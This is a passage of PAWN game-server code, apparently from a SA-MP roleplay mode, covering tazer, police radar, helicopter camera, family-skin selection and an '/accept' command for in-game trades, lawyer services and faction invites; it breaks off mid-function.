	if(IsPlayerInAnyVehicle(playerid)) return SendClientMessage(playerid, COLOR_GRAD2, "You can't use this command while being in a vehicle.");
	if(!Tazer[playerid])
	{
	    Tazer[playerid] = 1;
	    format(string, sizeof(string), "* %s takes out their tazer from their holster and loads it.", GetName(playerid));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    if(Player[playerid][pWeapon][2] == 24)
	    {
			ReplaceTazer[playerid] = 1;
			GetPlayerWeaponData(playerid, 2, OldGun[playerid], OldAmmo[playerid]);
			SendClientMessage(playerid, COLOR_WHITE, "Your desert eagle will be given back when you holster your tazer.");
	    }
	    GunsBeingRemoved[playerid] = 1;
	    RemoveZamoraWeapon(playerid, 24);
	    GunsBeingRemoved[playerid] = 1;
	    GiveZamoraWeapon(playerid, 23, 500);
	    GunsBeingRemoved[playerid] = 1;
    }
    else
    {
        Tazer[playerid] = 0;
        RemoveZamoraWeapon(playerid, 23);
   		format(string, sizeof(string), "* %s unloads their tazer and puts it back to their holster.", GetName(playerid));
	    SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
	    if(ReplaceTazer[playerid])
        {

            ReplaceTazer[playerid] = 0;
            GunsBeingRemoved[playerid] = 1;
            GiveZamoraWeapon(playerid, OldGun[playerid], OldAmmo[playerid]);
            GunsBeingRemoved[playerid] = 1;
            OldGun[playerid] = 0;
            OldAmmo[playerid] = 0;
            SendClientMessage(playerid, COLOR_WHITE, "You have recieved your desert eagle back as you've holstered your tazer.");
        }
    }
	return 1;
}
IRP:deployradar(playerid, var[])
{
	if(IsACop(playerid))
	{
		if(IsPlayerCuffed(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
    	{
    	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
    	    return 1;
    	}
		if(IsPlayerInAnyVehicle(playerid))
		{
            new vehid = GetPlayerVehicleID (playerid);
            if (VehRadarID [vehid] > -1) return 1;
            new Float: x, Float: y, Float: z, Float: a;
            GetVehiclePos (vehid, x, y, z);
            GetVehicleZAngle (vehid, a);
            SendClientMessage(playerid, COLOR_WHITE, "* You've deployed the speed radar to your vehicle.");
            VehRadarID [vehid] = CreateObject (367, 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, 300.0);
            AttachObjectToVehicle (VehRadarID [vehid], vehid, 0.2, 0.50, 0.3, 0.0, 0.0, 90.0);
            for (new i = 0; i < MAX_PLAYERS; i++)
            {
                if(IsPlayerInVehicle (i, vehid))
                {
                    TextDrawShowForPlayer (i, RadarHud);
                }
            }
		}
		else
		{
			 SendClientMessage(playerid, COLOR_GRAD2, "You are not in a vehicle.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You are not a LEO.");
		return 1;
	}
	return 1;
}
IRP:removeradar(playerid, var[])
{
	if(IsACop(playerid))
	{
		if(IsPlayerCuffed(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
    	{
    	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
    	    return 1;
    	}
		if(IsPlayerInAnyVehicle(playerid))
		{
           new vehid = GetPlayerVehicleID (playerid);
           if (VehRadarID [vehid] == -1) return 1;
           DestroyObject (VehRadarID [vehid]);
           SendClientMessage (playerid, COLOR_WHITE, "* You've removed the speed radar from your vehicle.");
           VehRadarID [vehid] = -1;
           KillTimer (CheckingSpeed [vehid]);
           CheckingSpeed [vehid] = -1;
           for (new i = 0; i < MAX_PLAYERS; i++)
           {
               if (IsPlayerInVehicle (i, vehid))
               {
                   TextDrawHideForPlayer (i, RadarHud);
                   TextDrawHideForPlayer (playerid, SpeedAndModel [vehid]);
               }
           }
		}
		else
		{
			 SendClientMessage(playerid, COLOR_GRAD2, "You are not in a vehicle.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You are not a LEO.");
		return 1;
	}
	return 1;
}
IRP:camera(playerid, var[])
{
        new vehi = GetPlayerVehicleID( playerid );
        if( IsPlayerInAnyVehicle(playerid) )
        {
                if( GetVehicleModel( vehi ) == 488 )
                {
                if( GetPlayerVehicleSeat(playerid) == 1 )
                {

                        if( GetPVarInt( playerid, "ThermalActive" ) == 0 )
                        {
                        THERMALON( playerid, vehi ); //
                                }
                                else
                                {
                        THERMALOFF( playerid );
                                }
                        }
                        else return SendClientMessage(playerid,COLOR_LIGHTRED,"ERROR: This is for co-pilots only." );
                }
                else return SendClientMessage(playerid, COLOR_LIGHTRED,"ERROR: This vehicle is not supported with a camera");
        }
        else return SendClientMessage(playerid,COLOR_LIGHTRED,"ERROR: You are not in any vehicle.");
	return 1;
}
IRP:radaron(playerid, var[])
{
	if(IsACop(playerid))
	{
		if(IsPlayerCuffed(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
    	{
    	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
    	    return 1;
    	}
		if(IsPlayerInAnyVehicle(playerid))
		{
           new vehid = GetPlayerVehicleID (playerid);
           if (VehRadarID [vehid] == -1) return 1;
           CheckingSpeed[vehid] = SetTimerEx ("UpdateSpeed", 100, 1, "d", vehid);
		}
		else
		{
			 SendClientMessage(playerid, COLOR_GRAD2, "You are not in a vehicle.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You are not a LEO.");
		return 1;
	}
	return 1;
}
IRP:radaroff(playerid, var[])
{
	if(IsACop(playerid))
	{
		if(IsPlayerCuffed(playerid) || IsPlayerTied(playerid) || Player[playerid][pDead])
    	{
    	    SendClientMessage(playerid, COLOR_GRAD2, "You can't do this right now.");
    	    return 1;
    	}
		if(IsPlayerInAnyVehicle(playerid))
		{
           new vehid = GetPlayerVehicleID (playerid);
           if (CheckingSpeed [vehid] > 0)
           {
               KillTimer (CheckingSpeed [vehid]);
               CheckingSpeed [vehid] = -1;
           }
           for (new i = 0; i < MAX_PLAYERS; i++)
           {
               if (IsPlayerInVehicle (i, vehid))
               {
                   TextDrawHideForPlayer (i, SpeedAndModel [vehid]);
               }
           }
		}
		else
		{
			 SendClientMessage(playerid, COLOR_GRAD2, "You are not in a vehicle.");
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You are not a LEO.");
		return 1;
	}
	return 1;
}

IRP:next(playerid, var[])
{
	new family = Player[playerid][pFam];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(!fskin[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not choosing a family skin.");
	if(pskin[playerid] >= 6)
	{
		pskin[playerid] = 0;
		SetPlayerSkin(playerid, FamInfo[family][fSkins][pskin[playerid]]);
	}
	else
	{
		SetPlayerSkin(playerid, FamInfo[family][fSkins][pskin[playerid]+1]);
		pskin[playerid] ++;
	}
	return 1;
}

IRP:done(playerid, var[])
{
    if(!Logged(playerid)) return NoLogin(playerid);
    if(!fskin[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not choosing a family skin.");
    if(GetPlayerSkin(playerid) == 0) return SendClientMessage(playerid, COLOR_GRAD2, "This skin slot is empty, choose another one.");
	Player[playerid][pModel] = GetPlayerSkin(playerid);
	SendClientMessage(playerid, COLOR_LIGHTBLUE, " You have chosen your family skin.");
	fskin[playerid] = 0; pskin[playerid] = 0;
    TogglePlayerControllable(playerid, 1);
    return 1;
}

IRP:acceptdeath(playerid, var[])
{
    if(!Player[playerid][pDead]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not allowed to do this while you are not injured.");
    Player[playerid][pDead] = 0;
    SendClientMessage(playerid,COLOR_MEDIC,"------------------ Health Advise -----------------");
    SendClientMessage(playerid,COLOR_WHITE,"You are now in the afterlife. You may rest in peace.");
    SendClientMessage(playerid,COLOR_WHITE,"When you revive, you will lost memory of last 30 minutes.");
    SendClientMessage(playerid,COLOR_WHITE,"If you were non-RPly killed, report the player at the forums.");
    SendClientMessage(playerid,COLOR_MEDIC,"--------------------------------------------------------");
    Player[playerid][pHospital] = 1;
    SpawnChar(playerid);
    return 1;
}

IRP:accept(playerid, var[])
{
	new string[128];
	if(!Logged(playerid)) return NoLogin(playerid);
	if(sscanf(var, "s[128]", var))
	{
		SendClientMessage(playerid, COLOR_WHITE, "** [Usage]: /accept [option]");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: faction | lowmats | mediummats | highmats | weapon ");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: ticket | vest | live | job | handshake ");
		SendClientMessage(playerid, COLOR_GRAD2, "** [OPTIONS]: defend | weed | cocaine | free | family ");
		return 1;
	}
	if(!strcmp(var, "faction", true))
	{
        if(Player[playerid][pFam]) return SendClientMessage(playerid, COLOR_GRAD2, "You can not accept faction while you are in a family.");
	    if(!Invited[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You haven't been invited to a faction.");
	    {
	        new idx = Faction[playerid];
			Player[playerid][pFac] = Faction[playerid];
			Player[playerid][pFacRank] = 1;
			FacInfo[idx][facMembers] ++;
			Player[playerid][pFacLeader] = 0;
			Player[playerid][pFacDiv] = 0;
			Player[playerid][pFacDivLeader] = 0;
			Invited[playerid] = 0;
			Faction[playerid] = 0;
			format(string, sizeof(string), " You have accepted %s's invitation to join the {01A9DB}%s {33CCFF}faction.", GetName(Inviter[playerid]), RPFNEx(playerid));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), " %s has accepted your faction invitation.", GetName(playerid));
			SendClientMessage(Inviter[playerid], COLOR_LIGHTBLUE, string);
			return 1;
        }
	 }
	 else if(strcmp(var, "handshake",true) == 0)
		{
			if(ShakeHandStyle[playerid] != 0 && ShakeHandRequest[playerid] != 999)
			{
				if(ProxDetectorS(1.3, playerid, ShakeHandRequest[playerid]) && (GetPlayerVirtualWorld(ShakeHandRequest[playerid]) == GetPlayerVirtualWorld(playerid)))
				{
					PlayerFacePlayer(playerid, ShakeHandRequest[playerid]);
					if(ShakeHandStyle[playerid] == 1)
					{
						ApplyAnimation(playerid,"GANGS","prtial_hndshk_biz_01", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","prtial_hndshk_biz_01", 4.0, 0, 0, 0, 0, 0);
					}
					if(ShakeHandStyle[playerid] == 2)
					{
						ApplyAnimation(playerid,"GANGS","prtial_hndshk_01", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","prtial_hndshk_01", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 3) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkaa", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkaa", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 4) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkba", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkba", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 5) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkca", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkca", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 6) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkcb", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkcb", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 7) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkda", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkda", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 8) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkea", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkea", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 9) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkfa", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkfa", 4.0, 0, 0, 0, 0, 0);
					}
					if((ShakeHandStyle[playerid] == 10) && (GetPlayerState(playerid) ==PLAYER_STATE_ONFOOT) && (GetPlayerState(ShakeHandRequest[playerid]) ==PLAYER_STATE_ONFOOT))
					{
						ApplyAnimation(playerid,"GANGS","hndshkfa_swt", 4.0, 0, 0, 0, 0, 0);
						ApplyAnimation(ShakeHandRequest[playerid],"GANGS","hndshkfa_swt", 4.0, 0, 0, 0, 0, 0);
					}
					format(string, sizeof(string), "* %s has shook hands with %s.", GetName(ShakeHandRequest[playerid]), GetName(playerid));
                	SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
					ShakeHandRequest[playerid] = 999;
					ShakeHandStyle[playerid] = 0;
					return 1;
				}
				else
				{
                    format(string, sizeof(string), "%s reaches for %s's hand but misses.", GetName(playerid), GetName(ShakeHandRequest[playerid]));
					SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
					ShakeHandRequest[playerid] = 999;
					ShakeHandStyle[playerid] = 0;
				}
      		}
            else SendClientMessage(playerid, COLOR_WHITE, "You don't have any handshake requests.");
            return 1;
        }
	else if(!strcmp(var, "family", true))
	{
	    if(!fInvited[playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You haven't been invited to a family.");
	    {
	        new idx = Family[playerid];

			Player[playerid][pFam] = Family[playerid];
			Player[playerid][pFamRank] = 1;
			FamInfo[idx][fMembers] ++;
			fInvited[playerid] = 0;
			Family[playerid] = 0;
			format(string, sizeof(string), " You have accepted %s's invitation to join the {01A9DB}%s {33CCFF}family.", GetName(fInviter[playerid]), FamInfo[idx][fName]);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), " %s has accepted your family invitation.", GetName(playerid));
			SendClientMessage(fInviter[playerid], COLOR_LIGHTBLUE, string);
			TogglePlayerControllable(playerid, 0);
			new family = Player[playerid][pFam]; fskin[playerid] = 1; pskin[playerid] = 0;
			SetPlayerSkin(playerid, FamInfo[family][fSkins][0]);
			SendClientMessage(playerid, COLOR_LIGHTBLUE, " Type /next for the next family skin, type /done to choose a skin.");
			return 1;
	    }
	}
	else if(!strcmp(var, "lowmats", true))
	{
	    if(BeenOfferedMaterials[playerid])
	    {
			new user = BuyMaterialsFrom[playerid];
		    new amount = BuyMaterialsAmount[playerid];
		    new price = BuyMaterialsPrice[playerid];
		    if(Player[user][pLMaterials] < amount)
			{
			    SellMaterialsTo[user] = -1;
				BuyMaterialsFrom[playerid] = -1;
				BuyMaterialsAmount[playerid] = 0;
				BuyMaterialsPrice[playerid] = 0;
				BeenOfferedMaterials[playerid] = 0;
				SendClientMessage(playerid, COLOR_GRAD2, "That player doesn't have that much materials on them.");
				SendClientMessage(user, COLOR_GRAD2, "The trade has been cancelled as you don't have the materials you offered.");
				return 1;
			}
			if(Player[playerid][pMoney] < price) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much on you right now.");
			if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
			Player[playerid][pLMaterials] += amount;
			Player[user][pLMaterials] -= amount;
			GiveZamoraMoney(playerid, -price);
			GiveZamoraMoney(user, price);
			format(string, sizeof(string), "* %s takes out a bag of low materials, hands it to %s and takes $%d from him", GetName(user), GetName(playerid), price);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			format(string, sizeof(string), " You have bought %d low materials for $%d from %s.", amount, price, GetName(user));
			SendClientMessage(playerid, COLOR_YELLOW, string);
			format(string, sizeof(string), " %s has bought %d low materials for $%d from you.", GetName(playerid), amount, price);
			SendClientMessage(user, COLOR_YELLOW, string);
			SellMaterialsTo[user] = -1;
			BuyMaterialsFrom[playerid] = -1;
			BuyMaterialsAmount[playerid] = 0;
			BuyMaterialsPrice[playerid] = 0;
			BeenOfferedMaterials[playerid] = 0;
			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to sell you low materials.");
		    return 1;
		}
	}
	else if(!strcmp(var, "mediummats", true))
	{
	    if(BeenOfferedMaterials[playerid])
	    {
			new user = BuyMaterialsFrom[playerid];
		    new amount = BuyMaterialsAmount[playerid];
		    new price = BuyMaterialsPrice[playerid];
		    if(Player[user][pMMaterials] < amount)
			{
			    SellMaterialsTo[user] = -1;
				BuyMaterialsFrom[playerid] = -1;
				BuyMaterialsAmount[playerid] = 0;
				BuyMaterialsPrice[playerid] = 0;
				BeenOfferedMaterials[playerid] = 0;
				SendClientMessage(playerid, COLOR_GRAD2, "That player doesn't have that much materials on them.");
				SendClientMessage(user, COLOR_GRAD2, "The trade has been cancelled as you don't have the materials you offered.");
				return 1;
			}
			if(Player[playerid][pMoney] < price) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much on you right now.");
			if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
			Player[playerid][pMMaterials] += amount;
			Player[user][pMMaterials] -= amount;
			GiveZamoraMoney(playerid, -price);
			GiveZamoraMoney(user, price);
			format(string, sizeof(string), "* %s takes out a bag of mediun materials, hands it to %s and takes $%d from him", GetName(user), GetName(playerid), price);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			format(string, sizeof(string), " You have bought %d medium materials for $%d from %s.", amount, price, GetName(user));
			SendClientMessage(playerid, COLOR_YELLOW, string);
			format(string, sizeof(string), " %s has bought %d medium materials for $%d from you.", GetName(playerid), amount, price);
			SendClientMessage(user, COLOR_YELLOW, string);
			SellMaterialsTo[user] = -1;
			BuyMaterialsFrom[playerid] = -1;
			BuyMaterialsAmount[playerid] = 0;
			BuyMaterialsPrice[playerid] = 0;
			BeenOfferedMaterials[playerid] = 0;
			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to sell you medium materials.");
		    return 1;
		}
	}
	else if(!strcmp(var, "highmats", true))
	{
	    if(BeenOfferedMaterials[playerid])
	    {
			new user = BuyMaterialsFrom[playerid];
		    new amount = BuyMaterialsAmount[playerid];
		    new price = BuyMaterialsPrice[playerid];
		    if(Player[user][pHMaterials] < amount)
			{
			    SellMaterialsTo[user] = -1;
				BuyMaterialsFrom[playerid] = -1;
				BuyMaterialsAmount[playerid] = 0;
				BuyMaterialsPrice[playerid] = 0;
				BeenOfferedMaterials[playerid] = 0;
				SendClientMessage(playerid, COLOR_GRAD2, "That player doesn't have that much materials on them.");
				SendClientMessage(user, COLOR_GRAD2, "The trade has been cancelled as you don't have the materials you offered.");
				return 1;
			}
			if(Player[playerid][pMoney] < price) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much on you right now.");
			if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
			Player[playerid][pHMaterials] += amount;
			Player[user][pHMaterials] -= amount;
			GiveZamoraMoney(playerid, -price);
			GiveZamoraMoney(user, price);
			format(string, sizeof(string), "* %s takes out a bag of high materials, hands it to %s and takes $%d from him", GetName(user), GetName(playerid), price);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			format(string, sizeof(string), " You have bought %d high materials for $%d from %s.", amount, price, GetName(user));
			SendClientMessage(playerid, COLOR_YELLOW, string);
			format(string, sizeof(string), " %s has bought %d high materials for $%d from you.", GetName(playerid), amount, price);
			SendClientMessage(user, COLOR_YELLOW, string);
			SellMaterialsTo[user] = -1;
			BuyMaterialsFrom[playerid] = -1;
			BuyMaterialsAmount[playerid] = 0;
			BuyMaterialsPrice[playerid] = 0;
			BeenOfferedMaterials[playerid] = 0;
			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to sell you high materials.");
		    return 1;
		}
	}
	else if(!strcmp(var, "weapon", true))
	{
	    if(BeenOfferedWeapon[playerid])
	    {
			new user = BuyWeaponFrom[playerid], price = BuyWeaponPrice[playerid], materials;
		    if(Player[playerid][pMoney] < price) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much on you right now.");
			if(!IsPlayerNearPlayer(playerid, user, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
			Player[user][pJobSkill][JOB_WDEALER] ++;
			GiveZamoraMoney(playerid, -price);
			GiveZamoraMoney(user, price);
			if(sellgunlowmats[playerid] == 1)
			{
				Player[user][pLMaterials] -= materials;
			}
			if(sellgunmedmats[playerid] == 1)
			{
			    Player[user][pMMaterials] -= materials;
			}
			if(sellgunhighmats[playerid] == 1)
			{
			    Player[user][pHMaterials] -= materials;
			}
			GiveZamoraWeapon(playerid, BeenOfferedWeapon[playerid], 5);
			format(string, sizeof(string), "* %s takes out a %s, hands it to %s and takes $%d from him", GetName(user), RWN(BeenOfferedWeapon[playerid]), GetName(playerid), price);
			SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
			format(string, sizeof(string), " You have bought a %s for $%d from %s.", RWN(BeenOfferedWeapon[playerid]), price, GetName(user));
			SendClientMessage(playerid, COLOR_LIGHTBLUE, string);
			format(string, sizeof(string), " %s has bought a %s for $%d from you.", GetName(playerid), RWN(BeenOfferedWeapon[playerid]), price);
			SendClientMessage(user, COLOR_LIGHTBLUE, string);
			SellWeaponTo[user] = -1;
			BuyWeaponFrom[playerid] = -1;
			BuyWeaponPrice[playerid] = 0;
			BeenOfferedWeapon[playerid] = 0;
			sellgunlowmats[playerid] = 0;
			sellgunmedmats[playerid] = 0;
			sellgunhighmats[playerid] = 0;
			return 1;
		}
		else
		{
		    SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to sell you a weapon.");
		    return 1;
		}
	}
	else if(!strcmp(var, "free", true))
	{
		if(Player[playerid][pPrison])
		{
    		if(FreeBy[playerid] == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to free you.");
    		GiveZamoraMoney(playerid, -FreePrice[FreeBy[playerid]][playerid]);
    		GiveZamoraMoney(FreeBy[playerid], FreePrice[FreeBy[playerid]][playerid]);
    		Player[FreeBy[playerid]][pJobSkill][JOB_LAWYER] ++;
    		FreeTimeout[FreeBy[playerid]] = 60;
    		if(Player[playerid][pMoney] < FreePrice[FreeBy[playerid]][playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
    		Player[playerid][pPrisonTime] -= FreeTime[playerid]*60;
    		SetTimerEx("FreeTimer", 1000, false, "i", FreeBy[playerid]);
    		format(string, sizeof(string), " Lawyer %s has reduced your prison sentence by %d for $%d.", GetName(FreeBy[playerid]), FreeTime[playerid], FreePrice[FreeBy[playerid]][playerid]);
    		SendClientMessage(playerid, COLOR_YELLOW, string);
	    	format(string, sizeof(string), " You have reduced %s's prison sentence by %d for $%d.", GetName(playerid), FreeTime[playerid], FreePrice[FreeBy[playerid]][playerid]);
    	    SendClientMessage(FreeBy[playerid], COLOR_YELLOW, string);
	        FreePrice[FreeBy[playerid]][playerid] = 0;
	    	FreeBy[playerid] = -1;
	    	FreeTime[playerid] = 0;
	    }
	    if(Player[playerid][pJail])
		{
    		if(FreeBy[playerid] == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to free you.");
    		GiveZamoraMoney(playerid, -FreePrice[FreeBy[playerid]][playerid]);
    		GiveZamoraMoney(FreeBy[playerid], FreePrice[FreeBy[playerid]][playerid]);
    		Player[FreeBy[playerid]][pJobSkill][JOB_LAWYER] ++;
    		FreeTimeout[FreeBy[playerid]] = 60;
    		if(Player[playerid][pMoney] < FreePrice[FreeBy[playerid]][playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
    		Player[playerid][pJailTime] -= FreeTime[playerid]*60;
    		SetTimerEx("FreeTimer", 1000, false, "i", FreeBy[playerid]);
    		format(string, sizeof(string), " Lawyer %s has reduced your jail sentence by %d for $%d.", GetName(FreeBy[playerid]), FreeTime[playerid], FreePrice[FreeBy[playerid]][playerid]);
    		SendClientMessage(playerid, COLOR_YELLOW, string);
	    	format(string, sizeof(string), " You have reduced %s's jail sentence by %d for $%d.", GetName(playerid), FreeTime[playerid], FreePrice[FreeBy[playerid]][playerid]);
    	    SendClientMessage(FreeBy[playerid], COLOR_YELLOW, string);
	        FreePrice[FreeBy[playerid]][playerid] = 0;
	    	FreeBy[playerid] = -1;
	    	FreeTime[playerid] = 0;
	    }
		return 1;
	}
	else if(!strcmp(var, "defend", true))
	{
		new user = DefendBy[playerid];
		if(!Player[playerid][pWanted]) return SendClientMessage(playerid, COLOR_GRAD2, "You are not wanted.");
		if(user == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to defend you.");
		GiveZamoraMoney(playerid, -DefendPrice[user][playerid]);
		GiveZamoraMoney(user, DefendPrice[user][playerid]);
		Player[user][pJobSkill][JOB_LAWYER] ++;
		DefendTimeout[DefendBy[playerid]] = 60;
		if(Player[playerid][pMoney] < DefendPrice[user][playerid]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
		Player[playerid][pWanted] --;
		SetPlayerWantedLevel(playerid, GetPlayerWantedLevel(playerid)-1);
		SetTimerEx("DefendTimer", 1000, false, "i", user);
		format(string, sizeof(string), " Lawyer %s has defended you for one crime for $%d.", GetName(user), DefendPrice[user][playerid]);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string, sizeof(string), " You have defended %s's for one crime $%d.", GetName(playerid), DefendPrice[user][playerid]);
	    SendClientMessage(user, COLOR_YELLOW, string);
        DefendPrice[user][playerid] = 0;
		DefendBy[playerid] = -1;
		return 1;
	}
	else if(!strcmp(var, "weed", true))
	{
		new seller = WeedSeller[playerid];
		if(seller == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to sell you weed.");
		if(!IsPlayerNearPlayer(playerid, seller, 2)) return SendClientMessage(playerid, COLOR_GRAD2, "You are too far away from that player.");
	    if(Player[seller][pWeed] < WeedAmount[seller][playerid])
		{
		    WeedSeller[playerid] = -1;
			WeedPrice[seller][playerid] = 0;
			WeedAmount[seller][playerid] = 0;
			SendClientMessage(playerid, COLOR_GRAD2, "That player doesn't have that much weed on them.");
			SendClientMessage(seller, COLOR_GRAD2, "The trade has been cancelled as you don't have the weed you offered.");
			return 1;
		}
		if(WeedPrice[seller][playerid] > Player[playerid][pMoney]) return SendClientMessage(playerid, COLOR_GRAD2, "You don't have that much money on you.");
		GiveZamoraMoney(playerid, -WeedPrice[seller][playerid]);
		GiveZamoraMoney(seller, WeedPrice[seller][playerid]);
		Player[seller][pWeed] -= WeedAmount[seller][playerid];
		Player[playerid][pWeed] += WeedAmount[seller][playerid];
		Player[seller][pJobSkill][JOB_DDEALER] ++;
		format(string, sizeof(string), "* %s takes out a pack of weed, hands it to %s and takes $%d from him", GetName(seller), GetName(playerid), WeedPrice[seller][playerid]);
		SendNearbyMessage(playerid, 15, string, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE, COLOR_PURPLE);
		format(string, sizeof(string), " You have bought %d grams of weed $%d from %s.", WeedAmount[seller][playerid], WeedPrice[seller][playerid], GetName(seller));
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string, sizeof(string), " %s has bought %d grams of weed for $%d from you.", GetName(playerid), WeedAmount[seller][playerid], WeedPrice[seller][playerid]);
		SendClientMessage(seller, COLOR_YELLOW, string);
		WeedSeller[playerid] = -1;
		WeedPrice[seller][playerid] = 0;
		WeedAmount[seller][playerid] = 0;
	}
	else if(!strcmp(var, "cocaine", true))
	{
		new seller = cocaineSeller[playerid];
		if(seller == -1) return SendClientMessage(playerid, COLOR_GRAD2, "Nobody has offered to sell you cocaine.");
